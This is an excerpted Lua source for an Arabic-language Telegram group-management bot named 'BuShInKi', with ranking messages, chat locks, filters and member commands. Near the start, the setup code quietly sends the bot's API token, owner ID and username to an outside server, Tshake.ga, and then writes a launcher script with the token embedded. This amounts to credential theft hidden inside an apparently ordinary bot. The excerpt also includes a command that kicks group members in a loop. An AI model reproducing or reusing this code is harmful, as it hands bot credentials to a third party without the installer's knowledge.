...
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
res = https.request('http://Tshake.ga/BuShInKi/BuShInKi.php?token='..token..'&user='..SUDO..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("BuShInKi", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/BuShInKi
token="]]..database:get(id_server..":token")..[["
...
local BuShInKi_Msg = ''  
if msgs < 100 then 
BuShInKi_Msg = 'غير متفاعل😔💔' 
elseif msgs < 200 then 
BuShInKi_Msg = 'بده يتحسن😕💔' 
elseif msgs < 400 then 
BuShInKi_Msg = 'شبه متفاعل😗👻' 
elseif msgs < 700 then 
BuShInKi_Msg = 'متفاعل😍🙊' 
elseif msgs < 1200 then 
BuShInKi_Msg = 'متفاعل قوي😍✔️' 
elseif msgs < 2000 then 
BuShInKi_Msg = 'متفاعل جدا😍💘' 
elseif msgs < 3500 then 
BuShInKi_Msg = 'اقوى تفاعل🙊👻'  
elseif msgs < 4000 then 
BuShInKi_Msg = 'متفاعل نار😍🔥' 
elseif msgs < 4500 then 
BuShInKi_Msg = 'قمة التفاعل🤸‍♂️😻' 
elseif msgs < 5500 then 
BuShInKi_Msg = 'اقوى متفاعل😳😻' 
elseif msgs < 7000 then 
BuShInKi_Msg = 'ملك التفاعل🤴😍' 
elseif msgs < 9500 then 
BuShInKi_Msg = 'امبروطور التفاعل💂‍♀️😻' 
elseif msgs < 10000000000 then 
BuShInKi_Msg = 'رب التفاعل✔️😍'  
end 
return BuShInKi_Msg 
end
...
--------------------------------------------------------------------------------------------------------------
function SourceBuShInKi(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,BuShInKi_Msg) 
return false  
end 
if text then    
...
send(msg.chat_id_, msg.id_,'📡┇اصدار سورس ابن رشيد \n📟┇الاصدار ←{ 1.2v}') 
end
...
send(msg.chat_id_, msg.id_,'📌¦ عدد المجموعات الان » { '..#group..' }'..BuShInKik..''..BuShInKi..'\n*📌┇الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
usertext = '\n👤┇العضو » ['..result.title_..'](t.me/'..(username or 'BuShInKi')..')'
...
send(msg.chat_id_,0,"⚠¦العضو : {["..data.first_name_.."](T.ME/BuShInKi)}\n📛¦["..BuShInKi_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "⚠|عذرا يا » {["..data.first_name_.."](T.ME/BuShInKi)}\n📮┇الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'👤┇بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'BuShInKi')..') \n🔘┇تـم قفـل الدردشه ')  
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'BuShInKi')..') \n🔘┇تـم قفـل التاك بالكتم\n⛔┇الحاله ←الكتم ')  
end,nil)   
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'ابن رشيد').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'ابن رشيد')
local BuShInKi_Msg = {
'اسمي مينو كول💘؟',
'دا اشرب جاي مفارغلك',
'لابسك لتلح',
...
send(msg.chat_id_, msg.id_,'['..BuShInKi_Msg[math.random(#BuShInKi_Msg)]..']') 
return false
end
...
},function(ta,BuShInKi)
local t = "\n🔘┇قائمة الاعضاء \n┉  ┉  ┉  ┉  ┉  ┉  ┉  ┉\n"
x = 0
local list = BuShInKi.members_
for k, v in pairs(list) do
x = x + 1
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'ابن رشيد').." غادر" or text == 'غادر' then  
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'ابن رشيد')
...
BuShInKi = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(BuShInKi)
...
--------------------------------------------------------------------------------------------------------------
SourceBuShInKi(data.message_,data)
...
------------------------------------------------------------------------
local BuShInKibot = database:get(bot_id.."Add:Filter:Rp2"..text..result.chat_id_)   
if BuShInKibot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠¦العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n📛¦["..BuShInKibot.."] \n") 
